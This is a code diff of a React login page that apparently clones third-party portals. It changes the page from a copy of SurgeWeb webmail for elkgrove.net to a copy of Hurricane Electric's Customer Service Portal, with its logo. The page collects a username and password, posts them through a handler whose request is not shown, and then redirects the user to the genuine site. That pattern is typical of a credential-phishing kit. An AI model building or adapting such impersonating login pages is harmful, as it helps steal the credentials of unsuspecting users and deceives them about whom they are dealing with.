@@ -13,7 +13,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Elkgrove")
+    const[platform, setPlatform] = useState("Csp-he")
 
     const[showError, setShowError] = useState(false);
 
@@ -48,7 +48,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'http://mail.elkgrove.net:7080/surgeweb.exe';
+               window.location.href = 'https://csp.he.net/';
             }
           } catch (error) {
             // Handle error
@@ -62,7 +62,7 @@ function Home(){
     return (
         <>
            
-                <div className='py-5'>
+                <div className='py-2'>
 
                 </div>
 
@@ -73,7 +73,7 @@ function Home(){
             </button>
             </div>}
 
-            <div className='formdiv col-md-6 m-auto   shadow py-5'>
+            <div className='formdiv col-md-6 m-auto   shadow p-2'>
             {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
             <strong className='text-center'>Invalid Email or Password</strong> 
             <button type="button" className="close" data-dismiss="alert" aria-label="Close">
@@ -81,17 +81,27 @@ function Home(){
             </button>
             </div>}
 
-                <div className='cardhead text-center '>
-                Welcome to SurgeWeb
-                </div>
+            <div className=' py-2 text-center'>
+                <img className='navimage' src={helogo} />
 
-                <form onSubmit={handleSubmit} className="py-2">
+                <h3 className='mt-4 font-weight-bold'>Customer Service Portal</h3>
+
+                <h5 className='font-weight-bold'style={{
+                    color:"#ff6513",
+                    fontSize:"16px",
+                }}>Customer Login</h5>
+
+                <h5 className='lastme py-3'>If you don't have a login, please contact <span>support</span></h5>
+
+            </div>
+
+                <form onSubmit={handleSubmit} className="py-2 formborder col-md-10 px-2  m-auto">
 
                 <div class="formrow text-center mt-3">
                                 <span class="prompt"><label for="user">Username</label></span>
-                                                <div class="element"><input type="email"onChange={function(e){
+                                                <div class="element"><input type="text"onChange={function(e){
                                                     setUserName(e.target.value);
-                                                }}value={email} className='inputwide' required/> <span className='font-weight-bold'>@ elkgrove.net</span>
+                                                }}value={email} className='inputwide' required/> 
                                 </div>
                         </div>
 
@@ -105,43 +115,9 @@ function Home(){
                         </div>
 
 
-                        <div class="formrow text-center">
-                                <span class="prompt"><label for="user">Interface</label></span>
-                                                <div class="element">
-
-                                                    <select>
-                                                        <option value="standard">standard</option>
-                                                        <option value="basic">basic</option>
-                                                        <option value="mobile">mobile</option>
-
-                                                    </select>
-
-                                                    <select className='ml-3'>
-                                                    <option value="German" >Deutsch</option>
-					<option value="English" selected>English (UK) </option>
-					<option value="English US" >English (US) </option>
-					<option value="Spanish" >Español</option>
-					<option value="French" >Français</option>
-					<option value="Dutch" >Nederlands</option>
-					<option value="Portuguese Br" >Português (Brazil)</option>
-					<option value="Portuguese" >Português (Portugal)</option>
-					<option value="Russian" >Русский</option>
-					<option value="Hindi" >हिन्दी</option>
-					<option value="Japanese" >日本語</option>
-		
-                                                        
-                                                        
-                                                    </select>
-                                </div>
-                        </div>
 
 
-                        <div class="formrow text-center">
-                                <span class="prompt"><label for="user">Remember me</label></span>
-                                                <div class="element"><input  type="checkbox"className=''/>
-                                </div>
-                        </div>
-
+                        
 
                     
 
@@ -153,13 +129,7 @@ function Home(){
                                 </div>
                         </div>
 
-                        <div className='text-center py-1 px-2'style={{
-                            backgroundColor:"#007",
-                            color:"white",
-                        }}>
-                            SurgeWeb ©2009-2021 Netwin Ltd, about SurgeMail
-
-                        </div>
+                     
 
                        
 
@@ -173,7 +143,7 @@ function Home(){
             
             <br/>
 
-                <p className='info'>Webmail</p>
+             
         </>
     );
 
